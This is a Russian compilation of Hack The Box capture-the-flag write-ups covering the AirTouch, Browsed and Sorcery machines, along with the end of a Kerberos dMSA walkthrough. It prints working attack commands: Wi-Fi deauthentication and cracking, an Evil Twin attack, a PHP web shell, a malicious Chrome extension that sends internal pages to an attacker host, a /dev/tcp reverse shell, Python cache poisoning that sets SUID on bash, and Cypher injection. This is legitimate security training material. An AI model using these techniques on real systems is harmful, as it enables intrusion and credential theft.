Теперь нужно получить TGT-билет текущей учетной записи.


kerbeus asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.
htb /enctype:aes256





                                Получение TGT

Полученный билет передаем в запросе dMSA-билета.


kerbeus asktgs /targetuser:priv_dmsa$ /service:krbtgt/eighteen.htb /
dmsa /opsec /ticket:doIFpjC.....h0Yg==





                            Получение тикета dMSA

В полученном тикете есть ключи связанной учетной записи. То есть в Previous
Keys  окажется хеш пароля администратора. Авторизуемся через WinRM
и забираем флаг рута.


evil-winrm -i 10.129.17.160 -u Administrator -H
0B133BE956BFADDF9CEA56701AFFDDEC




                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Сегодня мы  на  примере  лабораторной
работы посмотрим, как можно  захватить
сеть Wi-Fi со слабым протоколом WPA-PSK.
Затем   проанализируем   трафик   Wi-Fi,                                                                                         RalfHacker
                                                                                          @RalfHackerChannelдобудем учетные данные от веб‑сервиса
и получим возможность  выполнять  про‐
извольный код на сервере. Для дальнейше‐
го продвижения проведем атаку  Evil Twin
на корпоративную сеть Wi-Fi.


Наша  конечная цель — получить  права  суперпользователя на машине
AirTouch с учебной площадки Hack The Box. Уровень сложности — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.129.244.98   airtouch.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг в любой атаке. Оно поз‐
воляет злоумышленнику узнать, какие службы на хосте принимают соеди‐
нения. На основе этой информации он выбирает следующий шаг, чтобы
получить точку входа.
   Самый  известный  инструмент для  сканирования — Nmap.  Улучшить
результаты его работы поможет такой скрипт:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он работает в два  этапа. Сначала  запускается быстрое сканирование,
затем — более тщательное, с помощью встроенных скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел один открытый порт — 22, служба OpenSSH 8.2p1. То есть
единственный открытый TCP-порт — SSH, и с ним ничего нельзя сделать,
а значит, просканируем UDP-порты. Можно сразу проверить самый рас‐
пространенный и полезный порт 161 — службу SNMP.


sudo nmap -p161 -A -sU 10.129.244.98 -Pn





                           Результат сканирования SNMP

Протокол SNMP  используют  для  мониторинга  сетевого  оборудования
и управления им. Информация в SNMP хранится в иерархическом дереве
объектов MIB (management information base), и у каждого объекта есть чис‐
ловой идентификатор OID (object identifier). В этих объектах нередко встре‐
чается чувствительная информация: логины, пути к интересным файлам, про‐
цессы и даже учетные данные.
  Nmap автоматически показал MIB sysDescr с OID 1.3.6.1.2.1.1.1 , где
указан пароль по умолчанию. Попробуем войти в службу SSH под пользовате‐
лем consultant .




                      Сессия пользователя consultant

Одно из первых мест, которые стоит проверить при повышении привиле‐
гий, — настройки sudoers. Посмотреть их можно командой sudo -l .





                               Настройки sudoers

Выяснили, что мы можем выполнить любую команду через sudo без ввода
пароля и получить интерактивную сессию root .





                         Сессия пользователя root


ПРОДВИЖЕНИЕ

WPA-PSK
Просматриваем файлы в домашнем каталоге и находим папку eaphammer.
Это каталог известной утилиты EAPHammer для атак Evil Twin на Wi‑Fi-сети
с WPA2-Enterprise.





                    Содержимое домашнего каталога

Это явно подсказка, так что сосредоточимся на взломе Wi‑Fi. Для перехвата
трафика переведем один из сетевых адаптеров в режим монитора. В этом
режиме адаптер принимает все пакеты из беспроводных сетей в радиусе
действия, а не только те, что адресованы ему.


ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0





                 Перевод интерфейса в режим монитора

Теперь запускаем сканирование беспроводных сетей во всех диапазонах
с помощью утилиты airodump-ng из пакета Aircrack-ng .


airodump-ng --band abg wlan0





                    Обнаруженные беспроводные сети

Обнаруживаем  точку  доступа  AirTouch-Internet  на  шестом  канале
с защитой WPA2-PSK. Нас интересует именно она, потому что к ней уже под‐
ключены клиенты (нижняя таблица). Наша задача — отключить клиент от сети,
затем поймать пакеты инициализации соединения при его повторном под‐
ключении и подобрать пароль по хендшейку. Перезапускаем airodump-ng ,
указав целевую точку доступа и канал.


airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 -w handshake wlan0

В другом терминале переводим второй интерфейс на канал 6 и отправляем
пакеты деаутентификации, чтобы клиент отключился от целевой сети.


iwconfig wlan1 channel 6
aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:A3:F1:A7 -c 28:
6C:07:FE:A3:22 wlan1





                             Атака деаутентификации

Это принудительно отключит клиенты от точки доступа, и при повторном под‐
ключении мы сможем перехватить хендшейк. О его захвате скажет надпись
WPA handshake в первой строке airodump-ng .





                     Захват трафика сети AirTouch-Internet

Передаем файл с записанным трафиком в Aircrack-ng , чтобы подобрать
пароль по словарю.


aircrack-ng -w /tmp/rockyou.txt -b F0:9F:C2:A3:F1:A7 handshake-01.cap





                             Результат подбора пароля

Так мы быстро получаем пароль от беспроводной точки доступа. Чтобы под‐
ключиться к Wi-Fi из терминала, будем использовать утилиту wpa_supplicant ,
но сперва с помощью wpa_passphrase нужно создать для нее файл кон‐
фигурации.


wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/conf.conf
wpa_supplicant -B -i wlan1 -c /tmp/conf.conf

Получаем IP-адрес по DHCP и сканируем подсеть, чтобы найти другие хосты.


dhclient wlan1
ip addr show wlan1


nmap -sn 192.168.3.0/24





                            Результат сканирования сети

В сети найден всего один хост — 192.168.3.1 , и это роутер. Прямого дос‐
тупа к нему с нашей основной машины нет, поэтому пробросим порт 80 через
SSH-туннель.


ssh consultant@10.129.244.98 -L 8000:192.168.3.1:80

Теперь весь трафик, который мы отправим на локальный порт 8000, будет
туннелироваться на порт 80 указанного хоста (в данном случае 192.168.3.1)
через SSH-хост. Открой сайт в браузере.





                           Главная страница сайта

На веб‑сервере нас встречает форма авторизации, но учетных данных у нас
пока нет. Зато у нас есть захваченное рукопожатие и пароль от сети Wi‑Fi,
а значит, мы можем расшифровать весь трафик WPA в Wireshark и пос‐
мотреть, есть ли там обращения к этому сервису. Открываем файл с зах‐
ваченным трафиком в Wireshark и снимаем шифрование: для этого перехо‐
дим в Edit → Preferences → Protocols → IEEE 802.11 и добавляем ключ в фор‐
мате wpa-pwd со значением challenge:AirTouch-Internet . Сетевые пакеты
примут понятный вид.





                              Настройки Wireshark

Теперь применяем фильтр http и получаем список запросов к нужному сер‐
вису. В клиентских запросах видим сессионные cookie и обращение к стра‐
нице lab.php.





                      Расшифрованный HTTP-трафик

Подставляем перехваченную cookie в браузер и открываем страницу lab.
php, доступную только авторизованному пользователю.





                      Содержимое страницы lab.php

На странице есть ссылка: переходим по ней и попадаем на страницу настрой‐
ки сети Wi‑Fi.





                      Страница настроек Wi-Fi-сети

Нам недоступна часть функций, поэтому я решил изменить в cookie роль
пользователя с user на admin , и это сработало. С сессией администратора
мы получаем доступ к расширенному набору возможностей, включая загрузку
файлов.





             Страница настроек Wi-Fi-сети (административная)

Пробуем загрузить простой PHP-шелл.


<?php system($_GET['cmd']); ?>

На сервере есть фильтр по расширению .php, но его удалось обойти, указав
расширение .phtml .





                        Ошибка загрузки файла




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИHACK THE BOX
       HTB AIRTOUCH
                ИНСЦЕНИРУЕМ АТАКУ
               НА ОФИСНУЮ СЕТЬ WI‑FI





                              Результат загрузки файла

Теперь перейдем к загруженному шеллу и выполним команду id .


curl 'http://127.0.0.1:8000/uploads/shell.phtml?cmd=id'





                          Результат выполнения команды

Есть RCE через загрузку файла. Теперь посмотрим содержимое каталога
веб‑сервера в поисках интересных файлов.


curl 'http://127.0.0.1:8000/uploads/shell.phtml?cmd=ls%20..'





                    Содержимое каталога веб‑сервера

Базы данных и конфигов нет, значит, поищем учетные данные в исходном
коде login.php.


curl 'http://127.0.0.1:8000/uploads/shell.phtml?cmd=cat%20../login.
php'





                      Содержимое файла login.php

В исходниках находим учетные данные пользователя. Чтобы подключиться
к шлюзу по SSH, пробросим 22-й порт через туннель.


ssh consultant@10.129.244.98 -L 2222:192.168.3.1:22

Проверяем учетные данные с помощью NetExec .


nxc ssh 127.0.0.1 --port 2222 -u user -p JunDRDZKHDnpkpDDvay




                           Проверка учетных данных

С этими учетными данными подключимся по SSH и сразу проверим настройки
sudoers.


ssh -p 2222 user@127.0.0.1





                               Настройки sudoers

Как и в первом случае, sudoers ничем не ограничен. Получаем сессию root
и забираем первый флаг.





                       Флаг пользователя

В файловой системе найдем скрипт send_certs.sh , который копирует сер‐
тификаты на удаленный хост. В нем в открытом виде прописаны учетные дан‐
ные пользователя remote, а также пути к сертификатам на локальной и уда‐
ленной машине.





                    Содержимое файла send_certs.sh


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

В  каталоге certs-backup лежат сертификаты корпоративной сети  Wi‑Fi
с аутентификацией WPA-Enterprise.





                    Содержимое скрипта certs-backup

Теперь, когда у нас есть сертификаты, мы можем провести атаку Evil Twin:
поднять поддельную точку доступа и перехватить учетные данные подклю‐
чающихся клиентов. Делать это будем с помощью EAPHammer, который уже
установлен на первом роутере. Перенесем сертификаты на первый хост,
а затем импортируем их в EAPHammer.


./eaphammer --cert-wizard import --server-cert /tmp/server.crt
--ca-cert /tmp/ca.crt --private-key /tmp/server.key





                   Импорт сертификатов в EAPHammer

Опять просканируем точки доступа и получим информацию о сети AirTouch-
Office.


airodump-ng --channel 44 wlan0mon





                    Обнаруженные беспроводные сети

Теперь запускаем поддельную точку доступа. Указываем сетевой интерфейс,
канал, ESSID и BSSID целевой точки, а также параметр --creds , чтобы сох‐
ранить перехваченные учетные данные.


./eaphammer --creds -i wlan4mon -e "AirTouch-Office" -b AC:8B:A9:F3:
A1:13 -c 44 --auth wpa-eap

Ждем, когда клиент попытается подключиться к нашей поддельной точке.
В этот момент EAPHammer логирует NTLMv1-хеш.





                         Перехваченный NTLMv1-хеш

Брутить хеш будем  с помощью hashcat . Для NetNTLMv1  указываем
режим 5500 (параметр -m ).


hashcat -m 5500 'r4ulcl::::
6669d2d5ada9084e8f28d31bb114e6dd05af90b9dc2d2388:d0b9785704db744f'
rockyou.txt





                             Результат подбора пароля

Теперь  подключимся  к  сети  AirTouch-Office  с  помощью  утилиты
wpa_supplicant , но сначала создадим для нее файл с настройками. Пос‐
кольку  сеть  использует  WPA-Enterprise,  конфигурация здесь  отличается
от  обычной WPA-PSK. В  конфиге  укажем домен и имя  пользователя
в параметре identity , а пароль — в параметре password .


ctrl_interface=/var/run/wpa_supplicant
ap_scan=1
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase1="peapver=0"
    phase2="auth=MSCHAPV2"
}

Запускаем wpa_supplicant с новым конфигом и получаем сетевые настрой‐
ки.


wpa_supplicant -Dnl80211 -i wlan2 -c /tmp/conf.conf
dhclient wlan4
ifconfig wlan4





                     Подключение к сети AirTouch-Office

Теперь, когда у нас есть доступ к целевой сети, мы можем подключиться
к роутеру по SSH под учетной записью remote из скрипта send_certs.sh .


ssh remote@10.10.10.1

Нам доступна серверная часть EAP-аутентификации для корпоративной сети
(hostapd-wpe),  получим  из  нее  учетные  данные.  Нам  нужен  файл
hostapd_wpe.eap_user .


cat /etc/hostapd/hostapd_wpe.eap_user





                Содержимое файла hostapd_wpe.eap_user

В файле есть пароль администратора. Авторизуемся по SSH под пользовате‐
лем admin. Sudoer снова ничем не ограничен.





                               Настройка sudoers

Переходим в сессию root и забираем второй флаг.





                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Python Cache  Poisoning —  это  техника
повышения     привилегий,    основанная
на  подмене  скомпилированных  файлов
байт‑кода. Я  покажу,  как ее  применять                                                                                         RalfHacker
                                                                                          @RalfHackerChannelпри  атаке на веб‑сервер, а  также  раз‐
работаем свое расширение для Chrome
и используем инъекцию команд ОС, чтобы
получить доступ к хостовой системе.


Наша  конечная цель — получить  права  суперпользователя на машине
Browsed с учебной площадки Hack The Box . Уровень сложности — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
У этой машины случайно выданный IP-адрес 10.129.244.79, который я добав‐
ляю в /etc/hosts , чтобы обращаться к этому хосту по имени.


10.129.244.79    browsed.htb

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг в любой атаке. Оно поз‐
воляет злоумышленнику узнать, какие службы на хосте принимают соеди‐
нения. На основе этой информации он выбирает следующий шаг, чтобы
получить точку входа.
   Самый  известный  инструмент для  сканирования — Nmap.  Улучшить
результаты его работы поможет следующий скрипт:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он работает в два  этапа. Сначала  запускается быстрое сканирование,
затем — более тщательное, с помощью встроенных скриптов (опция -A ).
   Подробнее о работе с Nmap читай в статье « Nmap с самого начала. Осва‐
иваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — OpenSSH 9.6p1;
 • 80 — веб‑сервер Nginx 1.24.0.

На главной странице сайта нас встречает платформа для тестирования рас‐
ширений браузера Chrome.





                           Главная страница сайта


ТОЧКА ВХОДА

На странице Samples можно скачать несколько расширений.





                            Страница Samples

Скачиваем первый архив и смотрим, что внутри.





                      Содержимое архива fontify.zip

Наибольший интерес представляет файл manifest.json — конфиг рас‐
ширения Chrome. В нем хранятся метаданные, а также описаны его структура
и разрешения.





                     Содержимое файла manifest.json

Параметр matches : <all_urls> означает, что content.js будет выполняться
на любом сайте. Этот манифест можно использовать как шаблон для своего
расширения, но сначала перейдем на страницу загрузки на сервер рас‐
ширений и загрузим скачанный файл.





                              Результат загрузки файла

Помимо логов тестирования, важную информацию дает и ответ сервера. Так
мы узнаем, что домен browsedinternals.htb соответствует localhost.


curl -F "extension=@fontify.zip;type=application/zip" http://browsed.
htb/upload.php


                                 Ответ сервера


ТОЧКА ОПОРЫ

Сделаем свое расширение из двух файлов: манифеста Expl и скрипта
на JavaScript.


{
  "manifest_version": 3,
  "name": "Expl",
  "version": "1.0.0",
  "description": "Expl",
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_idle"
    }
  ]
}

В файле content.js будем отправлять запрос на browsedinternals.htb,
кодировать ответ сервера в Base64 и отправлять его на свой веб‑сервер.


(async function() {
   async function exfilExternal(content) {
      const b64 = btoa(unescape(encodeURIComponent(content)));
      await fetch(`http://10.10.15.29:8000/exfil`, {
         method: 'POST',
         body: b64
      });
   }


   async function reqInternal() {
      const resp = await fetch("http://browsedinternals.htb");
      return await resp.text();
   }


   const ans = await reqInternal();
   await exfilExternal(ans);
})();

На своем хосте поднимем веб‑сервер, который будет автоматически декоди‐
ровать из Base64 данные, приходящие на эндпоинт /exfil .


from http.server import HTTPServer, BaseHTTPRequestHandler
import base64


class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        cl = int(self.headers['Content-Length'])
        data = self.rfile.read(cl)


        try:
            print(base64.b64decode(data).decode('utf-8'))
            self.send_response(200)


        except Exception as e:
            self.send_response(500)


        self.end_headers()


HTTPServer(('0.0.0.0', 8000), ExfilHandler).serve_forever()

Упаковываем расширение в ZIP и отправляем на сайт. Почти мгновенно
получаем содержимое веб‑страницы в логах веб‑сервера Python.


curl -F "extension=@exfil.zip;type=application/zip" http://browsed.
htb/upload.php





                               Логи веб‑сервера

Открываем страницу в браузере и понимаем, что это GitLab.





                          Страница в браузере

Будем постепенно получать информацию из Gitea. Для этого сначала изме‐
ним функцию reqInternal в файле content.js , чтобы запрос шел на стра‐
ницу /explore/repos , где находится список репозиториев Gitea. После этого
снова отправим расширение в сервис.


async function reqInternal() {
    const resp = await fetch("http://browsedinternals.htb/explore/
repos");
    return await resp.text();
}





                 Содержимое страницы с репозиториями

На  странице  с  репозиториями  находим   только  один —  larry/
MarkdownPreview. Посмотрим, что внутри.


async function reqInternal() {
    const resp = await fetch("http://browsedinternals.htb/larry/
MarkdownPreview");
    return await resp.text();
}





                          Страница репозитория

На странице репозитория видно несколько файлов. Попробуем скачать архив
со всем содержимым репозитория. Для этого изменим скрипт content.js :
теперь он будет скачивать не текст, а ZIP-файл и отправлять его на наш сер‐
вер как есть, без дополнительного кодирования.


(async function() {
   async function exfilExternal(content) {
      await fetch(`http://10.10.15.29:8000/exfil`, {
         method: 'POST',
         body: content
      });
   }


   async function reqInternal() {
      const resp = await fetch("http://browsedinternals.htb/larry/
MarkdownPreview/archive/main.zip");
      return await resp.arrayBuffer();
   }


   const ans = await reqInternal();
   await exfilExternal(ans);
})();

В коде веб‑сервера вместо вместо того, чтобы выполнять декодирование,
сохраним файл.


from http.server import HTTPServer, BaseHTTPRequestHandler
import base64


class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        cl = int(self.headers['Content-Length'])
        data = self.rfile.read(cl)


        try:
            with open(f"main.zip", 'wb') as f:
                f.write(data)
            self.send_response(200)


        except Exception as e:
            self.send_response(500)


        self.end_headers()


HTTPServer(('0.0.0.0', 8000), ExfilHandler).serve_forever()

После отправки нового расширения получаем файл и смотрим, что внутри
архива. Это веб‑приложение для просмотра файлов Markdown.





                       Содержимое файла Readme




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИHACK THE BOX
       HTB BROWSED
       ПОВЫШАЕМ ПРИВИЛЕГИИ В LINUX
        ЧЕРЕЗ ОТРАВЛЕНИЕ КЕША PYTHON





Command Injection
Смотрим исходный код на Python в репозитории веб‑приложения. Сразу
обращаем внимание на опасный вызов subprocess.run в роуте /routines
(строки 57–62). Эта функция не только запускает в системе скрипт routines.
sh , но и передает в него значение параметра rid, полученное от пользовате‐
ля.





                        Содержимое файла app.py

В скрипте routines.sh параметр сравнивается с числами от 0 до 3, чтобы
выбрать действие.





                      Содержимое файла routines.sh

Выражения [[ "$1" -eq 0 ]] очень опасны, так как позволяют выполнить
произвольный код, если передать в $1 не значение, а массив, в индексе
которого будет выражение $() , выполняющее указанную команду: [["a[$(
id)]" -eq 1]] .
   Запустим листенер ( pwncat-cs -lp 4321 ), а затем попробуем описанным
способом внедрить реверс‑шелл. Для этого изменим файл content.js , что‐
бы отправить запрос с нагрузкой на развернутое у пользователя приложение.


(async function() {
    const payload = btoa(`bash -c 'bash -i >& /dev/tcp/10.10.15.29/
4321 0>&1'`);
    const rs = `a[$(echo%20${payload}%20|base64%20-d|bash)]`;
    const url = "http://127.0.0.1:5000/routines/" + rs;
    const resp = await fetch(url, {});
})();

Сразу же получаем сессию пользователя larry .





                       Флаг пользователя

У пользователя есть приватный SSH-ключ. Забираем его и получаем доступ
по SSH.





                             Приватный SSH-ключ


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нужно собрать информацию. Источников много, и, чтобы не держать
все в голове, можно использовать PEASS-ng .

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE new generation (PEASS-ng) — набор скриптов, которые
проверяют систему на автомате и выдают подробный отчет о потенциально
интересных файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим ему права на выпол‐
нение и запустим сканирование. В выводе будет много информации, среди
которой найдутся настройки sudo . Из них мы узнаем, что можем выполнить
скрипт /opt/extensiontool/extension_tool.py от имени root без ввода
пароля.





                                Настройки sudo

В каталоге скрипта находим папку __pycache__ . Когда запускается скрипт,
интерпретатор  компилирует  все  импортируемые  модули  и  сохраняет
полученный байт‑код в каталог __pycache__ . При повторном запуске он заг‐
рузит байт‑код из кеша без повторной компиляции.





                 Содержимое каталога /opt/extensiontool

Посмотрим, какой файл кешируется. Для этого запустим скрипт и проверим
содержимое каталога.





                 Содержимое каталога /opt/extensiontool

Кешируется скрипт extension_utils.py , а значит, мы можем подменить
файл кеша и при следующем запуске в привилегированном контексте добить‐
ся выполнения произвольного кода. Посмотрим, что внутри: нам нужно будет
реализовать все функции, чтобы все работало корректно.





                   Содержимое файла extension_utils.py

Но и у файлов кеша есть свои особенности, подробно о них можно почитать
в документации . Такой скомпилированный байт‑код содержит временную
метку и размер исходного файла, что помогает отслеживать, вносились ли
в исходник изменения и нужно ли компилировать его заново.





                       Информация о файлах .pyc

Первым делом напишем код модуля /tmp/extension_utils.py . Будем экс‐
плуатировать функцию clean , в которой выставим S-бит для файла оболочки
/bin/bash .


import os


def clean_temp_files(a):
    os.system('chmod u+s /bin/bash')
    print('* clean')


def validate_manifest(a):
    print('* validate')
    return True

Теперь нужно добавить символы комментариев, чтобы размер нашего файла
был равен размеру оригинального.





                          Проверка размеров файлов


python3 -c 'print("#" * (1245 - 160))' >> /tmp/extension_utils.py

Один символ займет перевод строки, поэтому вычитаем 160, а не 161. Треть‐
им действием скопируем временные метки из оригинального файла.


touch -r /opt/extensiontool/extension_utils.py /tmp/extension_utils.
py

Напоследок скомпилируем файл сразу в каталог кеша.


python3 -c 'import py_compile; py_compile.compile("/tmp/
extension_utils.py", cfile="/opt/extensiontool/__pycache__/
extension_utils.cpython-312.pyc")'

Когда  все   будет   готово,   запустим   скрипт  /opt/extensiontool/
extension_tool.py . Видим вывод нашей функции clean . Таким же методом
можно проверить атрибуты файла /bin/bash и обнаружить, что на нем уста‐
новлен S-бит.


sudo /opt/extensiontool/extension_tool.py --clean





                             Эксплуатация уязвимости


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Запускаем новый Bash от имени root .


/bin/bash -p





                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Сегодня  будем  эксплуатировать  домен
FreeIPA и пройдем полную цепочку, начиная
с  атаки на сайт. Проэксплуатируем  инъ‐
екцию  Cypher, затем обойдем  проверку                                                                                         RalfHacker
                                                                                          @RalfHackerChannelPasskey на сайте и получим RCE через сер‐
вис Kafka. Проведем разведку на  хосте,
затем успешный фишинг и многое другое.


Наша конечная цель — получить права суперпользователя на машине Sorcery
с учебной площадки Hack The Box . Уровень сложности — «безумный».


           WARNING

                            Подключаться  к  машинам  HTB  лучше  через
                          средства   анонимизации   и   виртуализации.
                    Не делай этого с компьютеров, где хранятся важ‐
                     ные для тебя данные: ты окажешься в общей сети
                        с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.73    sorcery.htb

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи такого скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом выполняется обычное быстрое сканиро‐
вание, на втором — более тщательное, с использованием встроенных скрип‐
тов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — OpenSSH 9.6p1;
 • 443 — веб‑сервер Nginx 1.27.1.

Поле commonName в SSL-сертификате содержит доменное имя сайта. Оно уже
записано у нас в /etc/hosts .





                          Страница авторизации


ТОЧКА ВХОДА

На странице можно зарегистрироваться и войти по учетным данным или с
помощью токена Passkey. После регистрации получаем список постов.





                           Главная страница сайта

В настройках профиля можно записать Passkey на токен.





                             Страница Profile

Раз мы знаем реальный домен сайта, попробуем методом перебора найти
и другие — это расширит область тестирования. Для сканирования под‐
доменов можно использовать ffuf .


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB .
  Я предпочитаю легкий и очень быстрый ffuf . При запуске указываем сле‐
дующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists );
 • -t — количество потоков;
 • -r — выполнять редиректы;
 • -fs — фильтровать страницы по размеру;
 • -fc — исключить из результата ответы с кодом 403.

Место перебора помечается словом FUZZ.


Запускаем сканер, перечислив все параметры:


ffuf -u "https://sorcery.htb/" -H 'Host: FUZZ.sorcery.htb' -w
subdomains-bitquark-top100000.txt -t 128





                       Результат сканирования поддоменов

В вывод утилиты попали все варианты из списка, поэтому лучше использовать
фильтры, например по размеру ответа (параметр -fs).


ffuf -u "https://sorcery.htb/" -H 'Host: FUZZ.sorcery.htb' -w
subdomains-bitquark-top100000.txt -t 128 -fs 169



                       Результат сканирования поддоменов

Находим новый ресурс и обновляем запись в файле /etc/hosts .


10.10.11.73 sorcery.htb git.sorcery.htb





                           Главная страница Gitea

В   списке   публичных   проектов   есть   доступный  без   авторизации
infrastructure .





                           Список репозиториев





                  Содержимое репозитория infrastructure

У репозитория есть одна активная задача, где речь идет об инъекции SQL-
запроса в базу данных.





                            Страница задачи


ТОЧКА ОПОРЫ

Cypher Injection
Скачиваем исходный код из репозитория и находим все обработчики зап‐
росов. Один из GET-обработчиков принимает id и по нему возвращает нуж‐
ный объект Product .





                       Исходный код приложения

Судя по параметру,  обработчик вызывается при переходе на страницу
товара. Идентификатор видно в адресной строке браузера.





                           Страница продукта

Из файла docker-compose.yml узнаем, что используется база данных Neo4j,
а значит, будем тестировать инъекцию в запрос Cypher.





                 Содержимое файла docker-compose.yml

В файле initial_data.rs находим запись продукта, страницу которого мы
открыли в браузере. У объекта Product есть свойство id , по которому идет
фильтрация, а свойства name и description отображаются на странице.





                   Содержимое страницы initial_data.rs

Попробуем изменить свойство description . Найденный объект возвращает‐
ся в ответе как result. Запрос к базе данных, который использует приложе‐
ние, должен выглядеть примерно так: MATCH (p:Product {id: "<id>"}) .
   Здесь проведем инъекцию: добавим к id в адресной строке браузера
часть Cypher-запроса, предварительно закодировав ее через URL encoding.
В  результате  вместо  описания  продукта на  странице  появилось наше
«INJECT!!!», что подтверждает наличие инъекции Cypher.


"}) SET result.description = "INJECT!!!" RETURN result; //





                           Результат внедрения запроса

В исходном коде user.rs найдем объект User . Можем попробовать изменить
свойства любого пользователя, например password у учетной записи admin .





                        Содержимое файла user.rs

Проблема в том, что в свойстве password хранится не пароль в открытом
виде, а хеш. Вместо того чтобы вычислять хеш по неизвестному алгоритму,
можно получить хеш уже известного нам пароля, например от своей учетной
записи. Для этого в запросе Cypher находим своего пользователя и записы‐
ваем значение его свойства password в свойство description продукта.
После этого на странице появится хеш пароля нашего пользователя.


"}) MATCH (u:User {username: 'ralf'}) SET result.description = u.
password RETURN result; //





                           Результат внедрения запроса

Теперь мы можем записать этот хеш в свойство password учетной записи
admin и войти под админом с паролем ralf .


"}) MATCH (u:User {username: 'admin'}) SET u.password = "$argon2id$v=
19$m=19456,t=2,p=1$DbYJN0Cy7bdO9nKIb8NPgg$CMB9Wld6IX3J/
dsj8HqiLSFUCPMfqEDh/x4dD1fyClE" RETURN result; //





                          Панель администратора


Kafka RCE
Администратору доступны новые разделы, например Debug . Но чтобы с ним
работать, нужно авторизоваться через Passkey.





                             Страница Debug

На странице Blog есть информация об учениях по фишингу: сотрудникам
нельзя переходить по ссылкам, если они не ведут на домен .sorcery.htb
или если сайт не использует HTTPS. Кроме того, сайт должен использовать
сертификат компании, подписанный корневым сертификатом с FTP-сервера.
Во  втором сообщении  говорится,  что  пользователь tom_summers ввел
в фишинговую форму учетные данные от сервиса Gitea.





                              Страница Blog

Информация полезная, к ней мы вернемся позже, а пока попробуем авто‐
ризоваться с помощью Passkey. Чтобы эмулировать физический токен, перей‐
дем в панель разработчика Chrome → Application → More tools → WebAuthn.





                       Панель разработчика Chrome

В открывшейся панели WebAuthn добавляем новый аутентификатор.





                             Панель WebAuthn

Переходим в профиль пользователя и записываем данные на эмулированный
токен.





                          Запись данных на токен

Когда все готово, выходим из  учетной записи и заново  авторизуемся
с помощью Passkey.





                             Авторизация Passkey

Теперь на странице Debug нас встречает форма отправки данных. Здесь
можно указать хост, порт и данные для отправки по этому адресу в формате
Hex.





                             Страница Debug

Посмотрим на службы, указанные в docker-compose.yml, и найдем сервис
Kafka на порте 9092.





                 Содержимое файла docker-compose.yml




                                     Продолжение статьи →
